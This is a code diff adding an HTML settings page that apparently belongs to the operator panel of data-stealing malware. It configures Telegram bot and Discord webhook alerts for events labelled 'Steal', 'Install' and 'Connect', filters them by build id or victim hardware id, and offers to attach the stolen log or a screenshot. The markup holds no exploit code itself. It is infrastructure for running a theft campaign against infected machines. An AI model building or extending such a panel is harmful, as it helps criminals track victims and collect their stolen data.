@@ -1,0 +1,232 @@
+<script src="pages/notify.js"></script>
+<div style="display: none;" onclick="$('.mainpopup').hide(); $('.backblur').hide();" class="backblur"></div>
+<div class="mainheader">
+    <div class="headselectorbutton headselectorbuttonactive" onclick="headsel('.methodspage',this);">
+        <b>
+            methods
+        </b>
+    </div>
+    <div class="headselectorbutton" onclick="headsel('.triggerpage',this); gettriggers();">
+        <b>
+            triggers
+        </b>
+    </div>
+</div>
+<div class="themepage methodspage">
+    <div class="buildcreatebut" id="buildcreatebut" onclick="$('#newmeth').show();$('.backblur').show();$('#firstbut').click();">
+        <p> Create new method </p>
+    </div>
+    <div class="mainpopup" id="newmeth">
+        <div class="pophead">
+            <div class="popname">
+                <b>New notification method</b>
+            </div>
+            <svg class="closebutton" onclick="$('.mainpopup').hide(); $('.backblur').hide();"
+                xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+        </div>
+        <div class="notifyselector">
+            <div id="firstbut" class="notifyselitem" style="border-bottom: var(--color1) 2px solid;"
+                onclick="changesel(this , '.telegrammethpage'); window.selmethtype = 0">telegram</div>
+            <div class="notifyselitem" onclick="changesel(this , '.discordmethpage'); window.selmethtype = 1">discord
+            </div>
+        </div>
+        <div style="font-size: 20px;" class="methpage telegrammethpage">
+            <center>
+                <input style="text-align:center; margin-top: 30px; margin-bottom: 20px;" id="methtgname" type="text"
+                    value="" placeholder="name">
+                <!-- <select style="" class="selector" id="" onchange="" >
+                                <option>
+                                    with the log
+                                </option>
+                                <option>
+                                    without a log
+                                </option>
+                            </select> -->
+                <div><input style="text-align:center; width: 550px; margin-top: 25px;" id="notifytgtok" type="text"
+                        value="" placeholder="token"></div>
+                <input style="text-align:center; width: 200px; margin-top: 25px;" id="notifytgchid" type="text" value=""
+                    placeholder="chat id">
+
+                <div style="margin-top: 25px;" onclick="checkmethod()" class="button1">check</div>
+                <div id="tokencheckstatus" style="margin-top: 10px;"></div>
+            </center>
+        </div>
+        <div class="methpage discordmethpage" style="display:none; font-size: 20px;">
+            <div><input style="text-align:center; margin-top: 30px; margin-bottom: 20px;" id="methdsname" type="text"
+                    value="" placeholder="name"></div>
+            <input style="text-align:center; width: 550px; margin-top: 25px;" id="notifydshook" type="text" value=""
+                placeholder="WebHook">
+            <center>
+                <div style="margin-top: 35px;" onclick="checkmethod()" class="button1">check</div>
+            </center>
+        </div>
+        <div class="bottombutton">
+            <center>
+                <div class="button1" onclick="addmethod()" style="width: calc(100% - 24px);">Create method</div>
+            </center>
+        </div>
+    </div>
+    <div class="maingrid" id="meth">
+
+
+    </div>
+</div>
+<div style="display: none;" class="themepage triggerpage">
+    <div class="buildcreatebut" id="buildcreatebut" onclick="shownewtrig(); $('#firstbut2').click();">
+        <p> Create new trigger </p>
+    </div>
+    <div class="maingrid" id="trig">
+    </div>
+    <div class="mainpopup" id="newtrig">
+        <div class="pophead">
+            <div class="popname">
+                <b>New notification trigger</b>
+            </div>
+            <svg class="closebutton" onclick="$('.mainpopup').hide(); $('.backblur').hide();"
+                xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+        </div>
+        <div class="notifyselector">
+            <div class="notifyselitem" id="firstbut2" style="border-bottom: var(--color1) 2px solid;"
+                onclick="window.trigsel = 'panel'; changesel(this , '.fulltrigpage'); window.selmethtype = 0">everyone</div>
+            <div class="notifyselitem" onclick="window.trigsel = 'build'; changesel(this , '.buildtrigpage'); window.selmethtype = 1">build
+            </div>
+            <div class="notifyselitem" onclick="window.trigsel = 'user'; changesel(this , '.usertrigpage'); window.selmethtype = 2">user</div>
+        </div>
+
+        <div style="font-size: 20px; display: none;" class="methpage usertrigpage">
+        <div style="display: flex; height: 100%;">
+                <div style="width: 50%; align-content: center;">
+                    <center>
+                        <div>Method</div>
+                        <select class="methsel selector" id="methodsuser" onchange="">
+                        </select>
+                    </center>
+                   
+                    <center>
+                        <div style="margin-top: 20px;">Event</div>
+                        <select class="othersel selector" id="" onchange="" style="">
+                            <option>
+                                Connect
+                            </option>
+                        </select>
+                    </center>
+                <center>
+                    <div style="display: inline-flex; margin-top: 20px;">
+                        <div><input class="checkbox" id="Userattach" type="checkbox"></div>
+                        <div style="margin-top: 7px;" id="galka">Attach Screen</div>
+                    </div>
+                </center>
+                    <center>
+                        <div>
+                            <input style="text-align:center; margin-top: 30px; margin-bottom: 20px;" id="userhwid" type="text" value="" placeholder="user id">
+                        </div>
+                    </center>
+                </div>
+                <div style="width: 50%">
+                    <textarea id="notifyusertextarea" class="textareatrig" placeholder='Select the method !' style="background: black; margin-top: 2px; color: azure; height:99%; resize: none; width:99%"></textarea>
+                </div>
+            </div>
+        </div>
+
+        <div style="font-size: 20px; display: flex;" class="methpage fulltrigpage">
+            <div style="width: 50%; align-content: center;">
+                <!-- <center><div>
+                    <div>Value</div>
+                    <select class="selector" id="notifytarget" onchange="" style="">
+                        <option>
+                            1
+                        </option>
+                    </select>
+                </div></center> -->
+                <center>
+                    <div>Method</div>
+                    <select class="methsel selector" id="notifymeth" onchange="">
+                    </select>
+                </center>
+
+                <center>
+                    <div style="margin-top: 20px;">Event</div>
+                    <select class="othersel selector" id="notifytarget" onchange="changenamefull()" style="">
+                        <option>
+                            Steal
+                        </option>
+                        <option>
+                            Install
+                        </option>
+                        <option>
+                            Connect
+                        </option>
+                    </select>
+                </center>
+                <center>
+                    <div style="display: inline-flex; margin-top: 20px;">
+                        <div><input class="checkbox" id="Fullattach"  type="checkbox"></div>
+                        <lable style="margin-top: 7px;" id="notifygalkafull">Attach Log</lable>
+                    </div>
+                </center>
+
+            </div>
+            <div style="width: 50%">
+                <textarea id="notifyalltextarea" class="textareatrig" placeholder='Select the method !'
+                    style="background: black; margin-top: 2px; color: azure; height:99%; resize: none; width:99%"></textarea>
+            </div>
+        </div>
+        <div style="font-size: 20px; display: none;" class="methpage buildtrigpage">
+            <div style="display: flex; height: 100%;">
+                <div style="width: 50%; align-content: center;">
+                    <center>
+                        <div>Method</div>
+                        <select class="methsel selector" id="methodsbuild" onchange="">
+                        </select>
+                    </center>
+                   
+                    <center>
+                        <div style="margin-top: 20px;">Event</div>
+                        <select class="othersel selector" id="notifyeventbuild" onchange="changenamebuild()" style="">
+                            <option>
+                                Steal
+                            </option>
+                            <option>
+                                Connect
+                            </option>
+                            <option>
+                                Install
+                            </option>
+                        </select>
+                    </center>
+                <center>
+                    <div style="display: inline-flex; margin-top: 20px;">
+                        <div><input class="checkbox" id="Buildattach" type="checkbox"></div>
+                        <lable style="margin-top: 7px;" id="notifygalkabuild">Attach Log</lable>
+                    </div>
+                </center>
+                    <center>
+                        <div>
+                            <input style="text-align:center; margin-top: 30px; margin-bottom: 20px;" id="buildhwid" type="text" value="" placeholder="build id">
+                        </div>
+                    </center>
+                    
+                </div>
+                <div style="width: 50%">
+                    <textarea id="notifybuildtextarea" class="textareatrig" placeholder='Select the method !'
+                        style="background: black; margin-top: 2px; color: azure; height:99%; resize: none; width:99%"></textarea>
+                </div>
+            </div>
+        </div>
+        <div class="bottombutton">
+            <center>
+                <div class="button1" onclick="addtrig()" style="width: calc(100% - 24px);">Create trigger</div>
+            </center>
+        </div>
+    </div>
+
+</div>
+</div>
